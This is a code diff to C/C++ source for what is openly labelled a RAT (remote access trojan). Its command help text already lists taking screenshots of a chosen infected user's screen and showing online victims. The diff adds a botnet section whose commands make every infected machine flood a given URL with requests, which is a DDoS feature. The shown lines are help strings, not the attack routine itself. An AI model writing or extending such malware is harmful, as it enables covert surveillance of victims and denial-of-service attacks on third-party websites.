@@ -180,6 +180,10 @@ INT_PTR DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
 						"%0AScreen manager:%0A"
 						"/user[ID] screenshot - take screenshot and send you %0A"
 
+						"%0ABotNet:%0A"
+						"/botnet start [url] - all users send requests on site %0A"
+						"/botnet stop - stop sending requests %0A"
+
 						"%0ARAT:%0A"
 						"/online - show online users%0A";
 						
